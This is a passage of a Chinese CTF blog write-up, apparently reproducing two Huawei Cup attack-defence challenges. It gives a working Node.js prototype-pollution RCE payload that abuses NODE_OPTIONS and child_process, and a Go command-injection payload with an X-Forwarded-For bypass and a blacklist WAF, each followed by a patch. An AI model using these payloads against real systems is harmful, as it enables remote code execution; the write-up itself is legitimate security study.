+<h1 id="imgupl0ad"><a href="#imgupl0ad" class="headerlink" title="imgupl0ad"></a>imgupl0ad</h1><p>能够上传文件到<code>public/upload</code>下，文件名随机，后缀为<code>jpg</code></p>
+<p>然后就莫名其妙<code>merge</code>了?</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">target, source</span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-string">&quot;__proto__&quot;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Param invalid&#x27;</span>)<br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231112182041097.png" srcset="/img/loading.gif" lazyload alt="image-20231112182041097"></p>
+<p>还有一个删除图片的功能，是使用系统命令去删除的</p>
+<p><img src="/./../img/image-20231112182134422.png" srcset="/img/loading.gif" lazyload alt="image-20231112182134422"></p>
+<p>再看一眼Node的版本：18</p>
+<p>直接打原生的原型链污染RCE</p>
+<h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;shell&quot;</span>: <span class="hljs-string">&quot;/proc/self/exe&quot;</span>,<br>        <span class="hljs-string">&quot;argv0&quot;</span>: <span class="hljs-string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cp /flag /app/public/flag&#x27;).toString())//&quot;</span>,<br>        <span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>: <span class="hljs-string">&quot;--require /proc/self/cmdline&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231112191041571.png" srcset="/img/loading.gif" lazyload alt="image-20231112191041571"></p>
+<p>接着访问<code>/rm</code>触发命令</p>
+<p><img src="/./../img/image-20231112190956658.png" srcset="/img/loading.gif" lazyload alt="image-20231112190956658"></p>
+<h2 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h2><p>禁掉原型链的关键字即可</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">target, source</span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-string">&quot;__proto__&quot;</span> || key == <span class="hljs-string">&quot;constructor&quot;</span> || key == <span class="hljs-string">&quot;prototype&quot;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Param invalid&#x27;</span>)<br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>彩蛋：此处为copilot给的提示，太强大了吧😍</p>
+<p><img src="/./../img/image-20231112191459123.png" srcset="/img/loading.gif" lazyload alt="image-20231112191459123"></p>
+<h1 id="Oddly-Sordid-Command"><a href="#Oddly-Sordid-Command" class="headerlink" title="Oddly_Sordid_Command"></a>Oddly_Sordid_Command</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> figlet<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/flamego/flamego&quot;</span><br>	<span class="hljs-string">&quot;os/exec&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Figlet</span><span class="hljs-params">(ctx flamego.Context)</span></span> <span class="hljs-type">string</span> &#123;<br>	<span class="hljs-keyword">if</span> ctx.RemoteAddr() != <span class="hljs-string">&quot;127.0.0.1&quot;</span> &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not allowed to access this page&quot;</span><br>	&#125;<br>	str := ctx.Query(<span class="hljs-string">&quot;str&quot;</span>)<br>	<span class="hljs-keyword">if</span> !Waf(str) &#123;<br>		str = <span class="hljs-string">&quot;Give up&quot;</span><br>	&#125;<br>	cmd, _ := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;figlet &quot;</span>+str).Output()<br>	<span class="hljs-built_in">println</span>(<span class="hljs-type">string</span>(cmd))<br>	<span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(cmd)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Waf</span><span class="hljs-params">(str <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>	blacklist := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;fffff111114g&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;tac&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>&#125;<br>	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> blacklist &#123;<br>		<span class="hljs-keyword">if</span> strings.Contains(str, v) &#123;<br>			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>套着Go外壳的命令注入</p>
+<h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><p><code>ip</code>的判断可以用<code>X-Forwarded-For</code>绕过</p>
+<p><code>figlet?str=| nl /fffff111114?</code></p>
+<p><img src="/./../img/image-20231112194631748.png" srcset="/img/loading.gif" lazyload alt="image-20231112194631748"></p>
+<h2 id="Patch-2"><a href="#Patch-2" class="headerlink" title="Patch"></a>Patch</h2><p>修复的话，单靠黑名单真怕又出啥非预期。</p>
+<p>命令注入的核心问题也是数据没有和命令隔离开来，在这里体现在执行<code>sh -c</code>后面的字符串直接把数据和命令拼接了。</p>
+<p><img src="/./../img/image-20231112195849963.png" srcset="/img/loading.gif" lazyload alt="image-20231112195849963"></p>
+<p>把<code>sh -c</code>去掉就行，效果如下</p>
+<p><img src="/./../img/image-20231112195926441.png" srcset="/img/loading.gif" lazyload alt="image-20231112195926441"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>华为杯ADWP赛后复现</div>
+      <div>http://example.com/2023/11/12/HuaWeiCup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/10/amqp/" title="Spring-AMQP CVE-2023-34050">
+                        <span class="hidden-mobile">Spring-AMQP CVE-2023-34050</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
